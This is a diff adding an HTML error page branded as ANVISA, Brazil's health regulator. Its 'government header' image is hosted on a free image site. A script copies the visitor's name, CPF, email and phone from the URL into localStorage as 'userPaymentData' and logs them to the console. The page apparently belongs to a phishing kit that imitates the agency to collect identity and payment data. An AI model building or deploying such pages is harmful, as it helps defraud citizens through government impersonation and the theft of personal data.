@@ -1,0 +1,154 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Erro | ANVISA</title>
+  <link href="https://cdn.tailwindcss.com" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+  <style>
+    body {
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background-color: #f8f9fa;
+    }
+    
+    .main-title {
+      font-size: 24px;
+      font-weight: 700;
+      color: #1351b4;
+      margin-bottom: 8px;
+    }
+    
+    .subtitle {
+      font-size: 16px;
+      color: #666666;
+      margin-bottom: 24px;
+    }
+    
+    .error-container {
+      background-color: white;
+      border-radius: 12px;
+      box-shadow: 0 4px 6px rgba(0,0,0,0.05);
+      overflow: hidden;
+      max-width: 700px;
+      margin: 0 auto;
+    }
+    
+    .error-header {
+      background-color: #fee2e2;
+      padding: 20px;
+      border-bottom: 1px solid #fecaca;
+    }
+    
+    .error-content {
+      padding: 30px;
+    }
+    
+    .btn {
+      padding: 12px 20px;
+      border-radius: 6px;
+      font-weight: 600;
+      font-size: 16px;
+      transition: all 0.2s ease;
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      cursor: pointer;
+      width: 100%;
+    }
+    
+    .btn-primary {
+      background-color: #1351b4;
+      color: white;
+      border: none;
+    }
+    
+    .btn-primary:hover {
+      background-color: #0e3f8a;
+    }
+    
+    .btn i {
+      margin-right: 8px;
+    }
+  </style>
+</head>
+<body>
+  <img src="https://i.ibb.co/btmZWCB/IMG-3113.jpg" alt="Government header" class="w-screen">
+  
+  <main class="max-w-3xl mx-auto px-4 py-6">
+    <div class="mb-6">
+      <h2 class="main-title">
+        Erro na Solicitação
+      </h2>
+      <p class="subtitle">
+        Ocorreu um problema ao processar sua solicitação
+      </p>
+    </div>
+    
+    <div class="error-container">
+      <div class="error-header">
+        <h3 class="text-lg font-semibold text-red-700 flex items-center">
+          <i class="fas fa-exclamation-circle mr-2"></i> 
+          Não foi possível processar sua solicitação
+        </h3>
+      </div>
+      
+      <div class="error-content">
+        <div class="bg-red-50 border-l-4 border-red-500 p-4 mb-6">
+          <p class="font-bold text-red-700 text-lg mb-2 flex items-center">
+            <i class="fas fa-exclamation-triangle mr-2"></i> Erro:
+          </p>
+          <p class="text-red-700">
+            {{ message }}
+          </p>
+        </div>
+        
+        <p class="text-gray-700 mb-6">
+          Por favor, tente novamente ou volte para a página anterior. Se o problema persistir, entre em contato com o suporte.
+        </p>
+        
+        <div class="mt-6">
+          <a href="/ttps" class="btn btn-primary">
+            <i class="fas fa-arrow-left"></i> Voltar para a página anterior
+          </a>
+        </div>
+      </div>
+    </div>
+  </main>
+  
+  <script>
+    // Script para salvar os dados no localStorage se existirem na URL
+    document.addEventListener('DOMContentLoaded', function() {
+      // Função para obter parâmetros da URL
+      function getQueryParam(param) {
+        const urlParams = new URLSearchParams(window.location.search);
+        return urlParams.get(param);
+      }
+      
+      // Verificar se existe algum dado de usuário na URL
+      const name = getQueryParam('name');
+      const cpf = getQueryParam('cpf');
+      const email = getQueryParam('email');
+      const phone = getQueryParam('phone');
+      
+      // Se existirem dados, salvar no localStorage
+      if (name && cpf) {
+        const userData = {
+          nome: name,
+          cpf: cpf,
+          email: email || '',
+          telefone: phone || ''
+        };
+        
+        // Salvar no localStorage
+        try {
+          localStorage.setItem('userPaymentData', JSON.stringify(userData));
+          console.log('Dados do usuário salvos no localStorage:', userData);
+        } catch (e) {
+          console.error('Erro ao salvar dados do usuário no localStorage:', e);
+        }
+      }
+    });
+  </script>
+</body>
+</html>
